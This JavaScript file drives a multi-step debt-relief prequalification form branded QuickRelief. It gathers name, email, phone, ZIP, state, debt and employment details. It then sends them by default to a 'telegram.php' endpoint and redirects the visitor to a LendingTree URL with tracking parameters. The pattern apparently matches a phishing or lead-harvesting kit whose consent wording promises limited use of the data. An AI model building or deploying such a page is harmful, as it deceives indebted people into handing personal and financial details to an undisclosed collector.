/* Loan Prequalify – Multi-step form
 * Vanilla JS. Sends final payload to telegram.php by default. */

(function () {
  "use strict";
  const SUCCESS_REDIRECT_URL =
    "https://www.lendingtree.com/form/grove-light/personal-loans/pl_40_100k?icode=52727&lttp=true&SpId=wp-personal&PersonalLoanPurposeCode=HOMEBUYING&esourceid=6131666&cchannel=seo&csource=lendingtree.com&cepage=%2Fpersonal%2F&sessionid=d3427bad-fb0e-4da7-97f4-7f07390aaa11&mta=1";
  const API_ENDPOINT =
    window.__QUOTE_API_ENDPOINT__ && typeof window.__QUOTE_API_ENDPOINT__ === "string"
      ? window.__QUOTE_API_ENDPOINT__
      : "telegram.php";

  const STATES = [
    "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA",
    "KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ",
    "NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT",
    "VA","WA","WV","WI","WY"
  ];

  const STEP_GROUPS = [
    { id: "basic", label: "Basic Info", short: "Info" },
    { id: "contact", label: "Contact Details", short: "Contact" },
    { id: "verify", label: "Verify Identity", short: "Verify" },
    { id: "quote", label: "Your Quote", short: "Quote" },
  ];

  const STEPS = [
    {
      id: "debtAmount",
      group: "basic",
      type: "choice",
      title: "How much credit card debt do you have?",
      subtitle:
        "Our program is for people who have $10k - $250k of credit card debt.",
      field: "debtAmount",
      options: [
        "Less than $10,000",
        "$10,000 - $20,000",
        "$20,000 - $40,000",
        "$40,000 - $75,000",
        "$75,000 - $150,000",
        "More than $150,000",
      ],
    },
    {
      id: "debtType",
      group: "basic",
      type: "choice",
      title: "What kind of debt do you have?",
      subtitle: "We help with most unsecured debt.",
      field: "debtType",
      options: [
        "Credit cards",
        "Personal loans",
        "Medical bills",
        "Collections / charge-offs",
        "Multiple types",
      ],
    },
    {
      id: "monthlyPayment",
      group: "basic",
      type: "choice",
      title: "How much do you pay toward debt each month?",
      subtitle: "An estimate is fine.",
      field: "monthlyPayment",
      options: [
        "Less than $250",
        "$250 - $500",
        "$500 - $1,000",
        "$1,000 - $2,000",
        "More than $2,000",
      ],
    },
    {
      id: "employmentStatus",
      group: "basic",
      type: "choice",
      title: "What's your employment status?",
      subtitle: "Steady income improves your options.",
      field: "employmentStatus",
      options: [
        "Employed full-time",
        "Employed part-time",
        "Self-employed",
        "Retired",
        "Unemployed",
      ],
    },
    {
      id: "state",
      group: "basic",
      type: "select",
      title: "What state do you live in?",
      subtitle: "Programs and savings vary by state.",
      field: "state",
      options: STATES,
      placeholder: "Choose your state",
    },
    {
      id: "name",
      group: "contact",
      type: "form",
      title: "Great — let's get you a personalized quote.",
      subtitle: "Tell us a bit about yourself.",
      fields: [
        {
          name: "firstName",
          label: "First name",
          type: "text",
          autocomplete: "given-name",
          placeholder: "Jane",
          required: true,
        },
        {
          name: "lastName",
          label: "Last name",
          type: "text",
          autocomplete: "family-name",
          placeholder: "Doe",
          required: true,
        },
      ],
    },
    {
      id: "contact",
      group: "contact",
      type: "form",
      title: "Where can we send your quote?",
      subtitle:
        "We'll only use this to share your savings estimate. No spam, ever.",
      fields: [
        {
          name: "email",
          label: "Email address",
          type: "email",
          autocomplete: "email",
          placeholder: "you@example.com",
          required: true,
          validate: (v) =>
            /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(v.trim())
              ? null
              : "Please enter a valid email.",
        },
        {
          name: "phone",
          label: "Phone number",
          type: "tel",
          autocomplete: "tel",
          placeholder: "(555) 123-4567",
          required: true,
          format: "phone",
          validate: (v) => {
            const digits = v.replace(/\D/g, "");
            return digits.length === 10
              ? null
              : "Enter a valid 10-digit phone number.";
          },
        },
        {
          name: "zipCode",
          label: "ZIP code",
          type: "text",
          inputmode: "numeric",
          autocomplete: "postal-code",
          placeholder: "94103",
          required: true,
          maxLength: 5,
          validate: (v) =>
            /^\d{5}$/.test(v.trim()) ? null : "Enter a 5-digit ZIP code.",
        },
      ],
    },
    {
      id: "verify",
      group: "verify",
      type: "consent",
      title: "Almost there — confirm and submit.",
      subtitle:
        "Review your info on the next screen. By continuing you confirm everything is accurate.",
      field: "consent",
    },
    {
      id: "quote",
      group: "quote",
      type: "review",
      title: "Review your quote request",
      subtitle: "Double-check, then send it over.",
    },
    {
      id: "done",
      group: "quote",
      type: "success",
      title: "You're all set!",
      subtitle:
        "We received your information and will be in touch shortly with your personalized savings estimate.",
    },
  ];

  const state = {
    currentIndex: 0,
    data: {},
    submitting: false,
  };

  const stepperEl = document.getElementById("stepper");
  const progressBar = document.getElementById("progressBar");
  const stepContainer = document.getElementById("stepContainer");
  const backBtn = document.getElementById("backBtn");
  const stepCounter = document.getElementById("stepCounter");
  const toast = document.getElementById("toast");
  const yearEl = document.getElementById("year");
  yearEl.textContent = new Date().getFullYear();

  function formatPhone(value) {
    const d = value.replace(/\D/g, "").slice(0, 10);
    if (d.length < 4) return d;
    if (d.length < 7) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
    return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
  }

  function showToast(message, variant = "default") {
    toast.textContent = message;
    toast.classList.remove("bg-rose-600", "bg-brand-navy", "bg-emerald-600");
    if (variant === "error") toast.classList.add("bg-rose-600");
    else if (variant === "success") toast.classList.add("bg-emerald-600");
    else toast.classList.add("bg-brand-navy");
    toast.classList.add("show");
    clearTimeout(showToast._t);
    showToast._t = setTimeout(() => toast.classList.remove("show"), 2800);
  }

  function renderStepper() {
    stepperEl.innerHTML = "";
    const currentGroupId = STEPS[state.currentIndex].group;
    const currentGroupIdx = STEP_GROUPS.findIndex(
      (g) => g.id === currentGroupId,
    );

    STEP_GROUPS.forEach((g, idx) => {
      const li = document.createElement("li");
      li.className = "flex flex-1 flex-col items-center";
      const isActive = idx === currentGroupIdx;
      const isComplete = idx < currentGroupIdx;
      li.innerHTML = `
        <div class="step-dot ${isActive ? "active" : ""} ${isComplete ? "complete" : ""}">
          ${
            isComplete
              ? '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="h-3 w-3 sm:h-3.5 sm:w-3.5"><path fill-rule="evenodd" d="M19.916 4.626a.75.75 0 01.208 1.04l-9 13.5a.75.75 0 01-1.154.114l-6-6a.75.75 0 011.06-1.06l5.353 5.353 8.493-12.74a.75.75 0 011.04-.207z" clip-rule="evenodd" /></svg>'
              : idx + 1
          }
        </div>
        <span class="step-label ${isActive ? "active" : ""}">
          <span class="step-label-short">${g.short}</span><span class="step-label-full">${g.label}</span>
        </span>
      `;
      stepperEl.appendChild(li);
    });

    const pct = ((state.currentIndex) / (STEPS.length - 1)) * 100;
    progressBar.style.width = `${pct}%`;
  }

  function renderTitle(step) {
    return `
      <header class="mb-6 text-center sm:mb-8">
        <h1 class="text-2xl font-extrabold tracking-tight text-brand-navy sm:text-3xl">
          ${step.title}
        </h1>
        ${
          step.subtitle
            ? `<p class="mx-auto mt-2 max-w-xl text-sm text-slate-500 sm:text-base">${step.subtitle}</p>`
            : ""
        }
      </header>
    `;
  }

  function renderChoice(step) {
    const selected = state.data[step.field];
    return `
      ${renderTitle(step)}
      <div class="mx-auto flex w-full max-w-md flex-col gap-3" role="listbox" aria-label="${step.title}">
        ${step.options
          .map(
            (opt) => `
          <button
            type="button"
            class="choice-btn"
            data-choice="${opt.replace(/"/g, "&quot;")}"
            aria-selected="${selected === opt ? "true" : "false"}"
          >
            <span>${opt}</span>
            <span class="arrow">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="h-5 w-5">
                <path fill-rule="evenodd" d="M12.97 3.97a.75.75 0 011.06 0l7.5 7.5a.75.75 0 010 1.06l-7.5 7.5a.75.75 0 11-1.06-1.06l6.22-6.22H3a.75.75 0 010-1.5h16.19l-6.22-6.22a.75.75 0 010-1.06z" clip-rule="evenodd" />
              </svg>
            </span>
          </button>
        `,
          )
          .join("")}
      </div>
    `;
  }

  function renderSelect(step) {
    const selected = state.data[step.field] || "";
    return `
      ${renderTitle(step)}
      <div class="mx-auto w-full max-w-md">
        <label for="select-${step.field}" class="field-label">State</label>
        <select id="select-${step.field}" class="text-input">
          <option value="" disabled ${!selected ? "selected" : ""}>${step.placeholder}</option>
          ${step.options
            .map(
              (o) =>
                `<option value="${o}" ${selected === o ? "selected" : ""}>${o}</option>`,
            )
            .join("")}
        </select>
        <p class="field-error" data-error-for="${step.field}">Please select your state.</p>
        <button type="button" id="primaryBtn" class="mt-6 w-full rounded-lg bg-brand-blue px-5 py-3.5 text-base font-bold text-white shadow-btn transition hover:bg-brand-lightblue active:translate-y-px">
          Continue
        </button>
      </div>
    `;
  }

  function renderForm(step) {
    return `
      ${renderTitle(step)}
      <div class="mx-auto grid w-full max-w-md gap-4">
        ${step.fields
          .map((f) => {
            const val = state.data[f.name] || "";
            return `
            <div>
              <label for="input-${f.name}" class="field-label">${f.label}</label>
              <input
                id="input-${f.name}"
                name="${f.name}"
                type="${f.type}"
                ${f.autocomplete ? `autocomplete="${f.autocomplete}"` : ""}
                ${f.inputmode ? `inputmode="${f.inputmode}"` : ""}
                ${f.maxLength ? `maxlength="${f.maxLength}"` : ""}
                placeholder="${f.placeholder || ""}"
                value="${val.replace(/"/g, "&quot;")}"
                class="text-input"
              />
              <p class="field-error" data-error-for="${f.name}"></p>
            </div>
          `;
          })
          .join("")}
        <button type="button" id="primaryBtn" class="mt-2 w-full rounded-lg bg-brand-blue px-5 py-3.5 text-base font-bold text-white shadow-btn transition hover:bg-brand-lightblue active:translate-y-px">
          Continue
        </button>
      </div>
    `;
  }

  function renderConsent(step) {
    const checked = !!state.data.consent;
    return `
      ${renderTitle(step)}
      <div class="mx-auto w-full max-w-md">
        <label class="flex cursor-pointer items-start gap-3 rounded-xl border border-slate-200 bg-brand-soft/50 p-4 hover:border-brand-lightblue">
          <input
            type="checkbox"
            id="consentBox"
            ${checked ? "checked" : ""}
            class="mt-1 h-5 w-5 cursor-pointer rounded border-slate-300 text-brand-blue focus:ring-brand-lightblue"
          />
          <span class="text-sm text-slate-600">
            I consent to be contacted by QuickRelief at the phone and email
            provided. I understand this is not a loan offer and that my
            information will be used only to prepare my personalized quote.
          </span>
        </label>
        <p class="field-error" data-error-for="consent">Please confirm to continue.</p>
        <button type="button" id="primaryBtn" class="mt-6 w-full rounded-lg bg-brand-blue px-5 py-3.5 text-base font-bold text-white shadow-btn transition hover:bg-brand-lightblue active:translate-y-px">
          Continue
        </button>
      </div>
    `;
  }

  function renderReview(step) {
    const d = state.data;
    const rows = [
      ["Name", [d.firstName, d.lastName].filter(Boolean).join(" ")],
      ["Email", d.email],
      ["Phone", d.phone],
      ["ZIP", d.zipCode],
      ["State", d.state],
      ["Debt Amount", d.debtAmount],
      ["Debt Type", d.debtType],
      ["Monthly Payment", d.monthlyPayment],
      ["Employment", d.employmentStatus],
    ].filter(([, v]) => v);

    return `
      ${renderTitle(step)}
      <div class="mx-auto w-full max-w-md">
        <dl class="divide-y divide-slate-100 rounded-xl border border-slate-200 bg-white">
          ${rows
            .map(
              ([k, v]) => `
            <div class="flex items-center justify-between px-4 py-3 text-sm">
              <dt class="font-semibold text-slate-500">${k}</dt>
              <dd class="text-right text-brand-navy">${v}</dd>
            </div>
          `,
            )
            .join("")}
        </dl>
        <button type="button" id="primaryBtn" class="mt-6 inline-flex w-full items-center justify-center gap-2 rounded-lg bg-brand-accent px-5 py-3.5 text-base font-extrabold text-brand-navy shadow-btn transition hover:bg-brand-accentDark active:translate-y-px disabled:cursor-not-allowed disabled:opacity-60">
          <span data-btn-label>Submit my request</span>
        </button>
        <p class="mt-3 text-center text-xs text-slate-400">
          By submitting you agree to be contacted regarding your inquiry.
        </p>
      </div>
    `;
  }

  function renderSuccess(step) {
    return `
      <div class="mx-auto flex max-w-md flex-col items-center text-center">
        <div class="success-check">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="h-10 w-10">
            <path fill-rule="evenodd" d="M19.916 4.626a.75.75 0 01.208 1.04l-9 13.5a.75.75 0 01-1.154.114l-6-6a.75.75 0 011.06-1.06l5.353 5.353 8.493-12.74a.75.75 0 011.04-.207z" clip-rule="evenodd" />
          </svg>
        </div>
        <h1 class="mt-6 text-2xl font-extrabold tracking-tight text-brand-navy sm:text-3xl">${step.title}</h1>
        <p class="mt-2 max-w-md text-sm text-slate-500 sm:text-base">${step.subtitle}</p>
        <button type="button" id="restartBtn" class="mt-8 rounded-lg bg-brand-blue px-5 py-3 text-sm font-bold text-white shadow-btn transition hover:bg-brand-lightblue">
          Start a new quote
        </button>
      </div>
    `;
  }

  function renderStep() {
    const step = STEPS[state.currentIndex];
    let html = "";
    switch (step.type) {
      case "choice":
        html = renderChoice(step);
        break;
      case "select":
        html = renderSelect(step);
        break;
      case "form":
        html = renderForm(step);
        break;
      case "consent":
        html = renderConsent(step);
        break;
      case "review":
        html = renderReview(step);
        break;
      case "success":
        html = renderSuccess(step);
        break;
    }

    stepContainer.classList.add("step-enter");
    stepContainer.innerHTML = html;
    requestAnimationFrame(() => {
      stepContainer.classList.add("step-enter-active");
      requestAnimationFrame(() => {
        stepContainer.classList.remove("step-enter", "step-enter-active");
      });
    });

    backBtn.disabled = state.currentIndex === 0 || step.type === "success";
    stepCounter.textContent =
      step.type === "success"
        ? ""
        : `Step ${state.currentIndex + 1} of ${STEPS.length - 1}`;

    bindStepEvents(step);
    renderStepper();
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function bindStepEvents(step) {
    if (step.type === "choice") {
      stepContainer.querySelectorAll("[data-choice]").forEach((btn) => {
        btn.addEventListener("click", () => {
          state.data[step.field] = btn.dataset.choice;
          stepContainer
            .querySelectorAll("[data-choice]")
            .forEach((b) => b.setAttribute("aria-selected", "false"));
          btn.setAttribute("aria-selected", "true");
          setTimeout(goNext, 220);
        });
      });
    }

    if (step.type === "select") {
      const sel = stepContainer.querySelector(`#select-${step.field}`);
      const errEl = stepContainer.querySelector(
        `[data-error-for="${step.field}"]`,
      );
      sel.addEventListener("change", () => {
        state.data[step.field] = sel.value;
        errEl.classList.remove("show");
        sel.classList.remove("invalid");
      });
      stepContainer
        .querySelector("#primaryBtn")
        .addEventListener("click", () => {
          if (!sel.value) {
            errEl.classList.add("show");
            sel.classList.add("invalid");
            return;
          }
          state.data[step.field] = sel.value;
          goNext();
        });
    }

    if (step.type === "form") {
      step.fields.forEach((f) => {
        const input = stepContainer.querySelector(`#input-${f.name}`);
        if (!input) return;
        if (f.format === "phone") {
          input.addEventListener("input", () => {
            input.value = formatPhone(input.value);
          });
        }
        input.addEventListener("input", () => {
          input.classList.remove("invalid");
          const errEl = stepContainer.querySelector(
            `[data-error-for="${f.name}"]`,
          );
          if (errEl) errEl.classList.remove("show");
        });
        input.addEventListener("keydown", (e) => {
          if (e.key === "Enter") {
            e.preventDefault();
            stepContainer.querySelector("#primaryBtn")?.click();
          }
        });
      });

      stepContainer
        .querySelector("#primaryBtn")
        .addEventListener("click", () => {
          let firstInvalid = null;
          step.fields.forEach((f) => {
            const input = stepContainer.querySelector(`#input-${f.name}`);
            const errEl = stepContainer.querySelector(
              `[data-error-for="${f.name}"]`,
            );
            const v = (input.value || "").trim();
            let err = null;
            if (f.required && !v) err = `${f.label} is required.`;
            if (!err && f.validate) err = f.validate(v);
            if (err) {
              if (errEl) {
                errEl.textContent = err;
                errEl.classList.add("show");
              }
              input.classList.add("invalid");
              if (!firstInvalid) firstInvalid = input;
            } else {
              state.data[f.name] = v;
            }
          });
          if (firstInvalid) {
            firstInvalid.focus();
            return;
          }
          goNext();
        });
    }

    if (step.type === "consent") {
      const box = stepContainer.querySelector("#consentBox");
      const errEl = stepContainer.querySelector(`[data-error-for="consent"]`);
      box.addEventListener("change", () => {
        state.data.consent = box.checked;
        if (box.checked) errEl.classList.remove("show");
      });
      stepContainer
        .querySelector("#primaryBtn")
        .addEventListener("click", () => {
          if (!box.checked) {
            errEl.classList.add("show");
            return;
          }
          state.data.consent = true;
          goNext();
        });
    }

    if (step.type === "review") {
      stepContainer
        .querySelector("#primaryBtn")
        .addEventListener("click", submitForm);
    }

    if (step.type === "success") {
      stepContainer
        .querySelector("#restartBtn")
        ?.addEventListener("click", () => {
          state.currentIndex = 0;
          state.data = {};
          renderStep();
        });
    }
  }

  function goNext() {
    if (state.currentIndex < STEPS.length - 1) {
      state.currentIndex += 1;
      renderStep();
    }
  }

  function goBack() {
    if (state.currentIndex > 0) {
      state.currentIndex -= 1;
      renderStep();
    }
  }

  backBtn.addEventListener("click", goBack);

  async function submitForm() {
    if (state.submitting) return;
    state.submitting = true;

    const btn = stepContainer.querySelector("#primaryBtn");
    const labelEl = btn?.querySelector("[data-btn-label]");
    if (btn) {
      btn.disabled = true;
      if (labelEl) {
        labelEl.innerHTML = `<span class="inline-flex items-center gap-2"><span class="spinner"></span> Sending...</span>`;
      }
    }

    try {
      const res = await fetch(API_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(state.data),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok || !json.ok) {
        throw new Error(json.error || "Something went wrong sending your info.");
      }
      showToast("Your information was sent!", "success");
      window.location.href = SUCCESS_REDIRECT_URL;
    } catch (err) {
      console.error(err);
      showToast(err.message || "Submission failed. Please try again.", "error");
      if (btn) {
        btn.disabled = false;
        if (labelEl) labelEl.textContent = "Submit my request";
      }
    } finally {
      state.submitting = false;
    }
  }

  renderStep();
})();
